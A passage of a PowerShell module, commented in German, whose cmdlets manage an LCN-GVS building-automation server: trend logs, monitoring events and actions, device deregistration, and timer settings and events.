
        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTrendLogValues))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $TrendLog = $Script:Tableau1Svc.GetTrendLogValues($Id,$start,$end,$scaleUnit,$intervalSecs)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TrendLog
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Get-LCNGVSTrendLogValueListMultiple
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTrendLogMultiple',
                  ConfirmImpact='Medium')]
    [Alias('Get-TrendLogValuesMultiple')]
    [OutputType([LCNGVS.Tableau.TrendLog])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [LCNGVS.Tableau.TrendLogRange[]] $TrendLogRanges,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [LCNGVS.Tableau.ScaleUnit] $scaleUnit,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $intervalSecs
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTrendLogValuesMultiple))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $TrendLog = $Script:Tableau1Svc.GetTrendLogValuesMultiple($TrendLogRanges,$scaleUnit,$intervalSecs)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TrendLog
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion

# -----------------------------------------------
# Webservice: MonitoringServer1 - Ereignismelder
# -----------------------------------------------
#region Komponente: Ereignismelder

# -----------------------------------------------
# MonitoringEvent - Ereignis (benoetigt Lizenzen)
# -----------------------------------------------

<#
    .SYNOPSIS
        Erzeugt ein neues zu ueberwachendes Ereignis.
    .DESCRIPTION
       Das LCN-GVS verfuegt ueber einen Ereignismelder, der Zustaende im LCN-Bus ueberwacht und beim Eintreten von vordefinierten Ereignissen entsprechende Aktionen ausfuehrt.
       Mit diesem Befehl koennen Sie ein neues zu ueberwachendes Ereignis erzeugen.

       Fuer den Ereignismelder sind Lizenzen erforderlich (entsprechend der Anzahl eingerichteter zu ueberwachender Ereignisse).
    .EXAMPLE
        New-LCNGVSMonitoringEvent
    .COMPONENT
        MonitoringServer (Ereignismelder)
    .ROLE
        MonitoringManagementRight (Ereignismelder)
    .LINK
        New-LCNGVSMonitoringEvent
        Get-LCNGVSMonitoringEvent
        Set-LCNGVSMonitoringEvent
        Add-LCNGVSMonitoringEvent
        Remove-LCNGVSMonitoringEvent
#>
function New-LCNGVSMonitoringEvent
{
    throw "This function is not implemented."
}

<#
    .SYNOPSIS
        Ruft die im LCN-GVS registrierten zu ueberwachenden Ereignisse ab.
    .DESCRIPTION
       Das LCN-GVS verfuegt ueber einen Ereignismelder, der Zustaende im LCN-Bus ueberwacht und beim Eintreten von vordefinierten Ereignissen entsprechende Aktionen ausfuehrt.
       Mit diesem Befehl koennen Sie die im LCN-GVS registrierten zu ueberwachenden Ereignisse abrufen.

       Fuer den Ereignismelder sind Lizenzen erforderlich (entsprechend der Anzahl eingerichteter Ereignisse).
    .EXAMPLE
        Get-LCNGVSMonitoringEvent
    .EXAMPLE
        Get-LCNGVSMonitoringEvent -all
    .EXAMPLE
        Get-LCNGVSMonitoringEvent -id 8eaf4ba7-aeb9-4f3c-8aa6-c355ea951838
    .COMPONENT
        MonitoringServer (Ereignismelder)
    .ROLE
        MonitoringManagementRight (Ereignismelder)
    .LINK
        New-LCNGVSMonitoringEvent
        Get-LCNGVSMonitoringEvent
        Set-LCNGVSMonitoringEvent
        Add-LCNGVSMonitoringEvent
        Remove-LCNGVSMonitoringEvent
#>
function Get-LCNGVSMonitoringEvent
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMonitoringEvent',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.MonitoringServer.MonitoringEvent[]])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Get Monitoring Events"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $MonitoringEvents = $Script:MonitoringServer1Svc.GetMonitoringEvents()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($pscmdlet.ParameterSetName -eq 'Id')
                    {
                        $MonitoringEvents | Where-Object -Property id -like -Value $Id
                    }
                    else
                    {
                        $MonitoringEvents
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
       Registriert oder aendert ein zu ueberwachendes Ereignis im LCN-GVS.
    .DESCRIPTION
       Das LCN-GVS verfuegt ueber einen Ereignismelder, der Zustaende im LCN-Bus ueberwacht und beim Eintreten von vordefinierten Ereignissen entsprechende Aktionen ausfuehrt.
       Mit diesem Befehl koennen Sie den uebergebenen im LCN-GVS eingerichteten Ereignismelder aendern oder fuegen einen neuen hinzu.

       Fuer den Ereignismelder sind Lizenzen erforderlich (entsprechend der Anzahl eingerichteter Ereignisse).
    .EXAMPLE
        Set-LCNGVSMonitoringEvent -MonitoringEvent $Event
    .EXAMPLE
        Add-LCNGVSMonitoringEvent -MonitoringEvent $Event
    .COMPONENT
        MonitoringServer (Ereignismelder)
    .ROLE
        MonitoringManagementRight (Ereignismelder)
    .LINK
        New-LCNGVSMonitoringEvent
        Get-LCNGVSMonitoringEvent
        Set-LCNGVSMonitoringEvent
        Add-LCNGVSMonitoringEvent
        Remove-LCNGVSMonitoringEvent
#>
function Set-LCNGVSMonitoringEvent # Alias: Add-LCNGVSMonitoringEvent
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSMonitoringEvent',
                  ConfirmImpact='Medium')]
    [Alias('Add-LCNGVSMonitoringEvent')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.MonitoringServer.MonitoringEvent] $MonitoringEvent
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Set Monitoring Event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:MonitoringServer1Svc.AddOrReplaceMonitoringEvent($MonitoringEvent)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
       Loescht das registrierte zu ueberwachende Ereignis im LCN-GVS.
    .DESCRIPTION
       Das LCN-GVS verfuegt ueber einen Ereignismelder, der Zustaende im LCN-Bus ueberwacht und beim Eintreten von vordefinierten Ereignissen entsprechende Aktionen ausfuehrt.
       Mit diesem Befehl koennen Sie den uebergebenen im LCN-GVS eingerichteten Ereignismelder loeschen.

       Fuer den Ereignismelder sind Lizenzen erforderlich (entsprechend der Anzahl eingerichteter Ereignisse).
    .EXAMPLE
        Remove-LCNGVSMonitoringEvent -id 8eaf4ba7-aeb9-4f3c-8aa6-c355ea951838
    .COMPONENT
        MonitoringServer (Ereignismelder)
    .ROLE
        MonitoringManagementRight (Ereignismelder)
    .LINK
        New-LCNGVSMonitoringEvent
        Get-LCNGVSMonitoringEvent
        Set-LCNGVSMonitoringEvent
        Add-LCNGVSMonitoringEvent
        Remove-LCNGVSMonitoringEvent
#>
function Remove-LCNGVSMonitoringEvent
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Remove-LCNGVSMonitoringEvent',
                  ConfirmImpact='High')]
    [Alias()]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Remove a Monitoring Event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:MonitoringServer1Svc.DeleteMonitoringEvent($Id)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# -----------------------------------------------
# MonitoringAction - Ausloeser, Aktion
# -----------------------------------------------

function New-LCNGVSMonitoringAction
{
    throw "This function is not implemented."
}

function Get-LCNGVSMonitoringAction
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMonitoringActions',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.MonitoringServer.AMonitoringAction[]])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Get Monitoring Action"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Actions = $Script:MonitoringServer1Svc.GetMonitoringActions()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($pscmdlet.ParameterSetName -eq 'Id')
                    {
                        $Actions | Where-Object -Property id -like -Value $Id
                    }
                    else
                    {
                        $Actions
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Set-LCNGVSMonitoringAction # Alias: Add-LCNGVSMonitoringAction
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSMonitoringAction',
                  ConfirmImpact='Medium')]
    [Alias('Add-LCNGVSMonitoringAction')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.MonitoringServer.AMonitoringAction] $Action
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Set Monitoring Action"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:MonitoringServer1Svc.AddOrReplaceMonitoringAction($Action)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Remove-LCNGVSMonitoringAction
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMonitoringActions',
                  ConfirmImpact='High')]
    [Alias()]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Remove a monitoring Action"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:MonitoringServer1Svc.DeleteMonitoringAction($Id, $true)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# ------------------------------------------------
# PushNotification
# -----------------------------------------------

function Unregister-Device
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Unregister-Device',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([Bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $DeviceId,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $DeviceType
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", $LocalizedData.UnregisterDevice))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:MonitoringServer1Svc.DeregisterDevice($DeviceType, $DeviceId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion

# -----------------------------------------------
# Webservice: Timer1 - Zeitsteuerung, Zeitschaltuhr
# -----------------------------------------------
#region Komponente: Zeitschaltuhr

<#
    .SYNOPSIS
        Ruft den Status der Zeitschaltuhr ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den derzeitigen Status der Zeitschaltuhr abrufen.
    .EXAMPLE
        Get-LCNGVSTimerEnabled
    .COMPONENT
        Timer (Zeitschaltuhr)
    .ROLE
        TimerManagementRight (Zeitschaltuhr)
    .LINK
        Set-LCNGVSTimerEnabled
#>
function Get-LCNGVSTimerEnabled
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTimerEnabled',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([Bool])]
    Param
    (
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", $Script:LocalizedData.GetLCNGVSTimerEnabled))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:Timer1Svc.IsEnabled()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Legt den Status der Zeitschaltuhr fest.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den Status der Zeitschaltuhr festlegen.
    .EXAMPLE
        Set-LCNGVSTimerEnabled -Enabled $true
    .COMPONENT
        Timer
    .ROLE
        TimerManagementRight (Zeitschaltuhr)
    .LINK
        Get-LCNGVSTimerEnabled
#>
function Set-LCNGVSTimerEnabled
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSTimerEnabled',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([Bool])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [bool] $Enabled
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", $Script:LocalizedData.SetLCNGVSTimerEnabled))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:Timer1Svc.SetEnabled($Enabled)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# -----------------------------------------------
# TimerEvent - Zeitschaltpunkt, ...
# -----------------------------------------------

<#
    .SYNOPSIS
        Erstellt ein neuen Zeitschaltpunkt.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein neues Zeitschaltpunkt (TimerEvent) erstellen.
    .PARAMETER  Description
        Geben Sie den Namen oder eine Beschreibung fuer den Zeitschaltpunkt an.
    .PARAMETER  Times
        Legen Sie die Ausloesezeitpunkte fuer den Zeitschaltpunkt fest.
    .PARAMETER  Actions
        Legen Sie die Aktionen fuer den Zeitschaltpunkt fest.
    .PARAMETER  Enabled
        Geben Sie den Zustand fuer den Zeitschaltpunkt an.
    .EXAMPLE
        New-LCNGVSTimerEvent -Description "Es wird Zeit!"
    .EXAMPLE
        New-LCNGVSTimerEvent -Name "Abends" -Status $false
    .COMPONENT
        Timer (Zeitschaltuhr)
    .ROLE
        TimerManagementRight (Zeitschaltuhr)
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function New-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/New-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Timer.TimerEvent])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias("Name")]
        [string] $Description,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Timer.Time[]] $Times,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Timer.SubAction[]] $Actions,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=3,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias("Status")]
        [bool] $Enabled
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Create a new timer event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $TimerEvent = [LCNGVS.Timer.TimerEvent]::new()
                    $TimerEvent.id = [GUID]::NewGuid()
                    $TimerEvent.Times = $Times
                    $TimerEvent.Action = $Actions
                    $TimerEvent.Description = $Description
                    $TimerEvent.enabled = $Enabled
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TimerEvent
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Rufen Sie ein oder mehrere Zeitschaltpunkte ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein oder mehrere Zeitschaltpunkte abrufen.
    .EXAMPLE
        Get-LCNGVSTimerEvent
    .EXAMPLE
        Get-LCNGVSTimerEvent -all
    .EXAMPLE
        Get-LCNGVSTimerEvent -Id 9249fe1a-e738-4f73-ab16-e2e00809b482
    .COMPONENT
        Timer (Zeitschaltuhr)
    .ROLE
        TimerManagementRight (Zeitschaltuhr)
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function Get-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Timer.TimerEvent[]])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Get timer events"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $TimerEvents = $Script:Timer1Svc.GetTimerEvents()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($pscmdlet.ParameterSetName -eq 'Id')
                    {
                        $TimerEvents | Where-Object -Property id -like -Value $Id
                    }
                    else
                    {
                        $TimerEvents
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
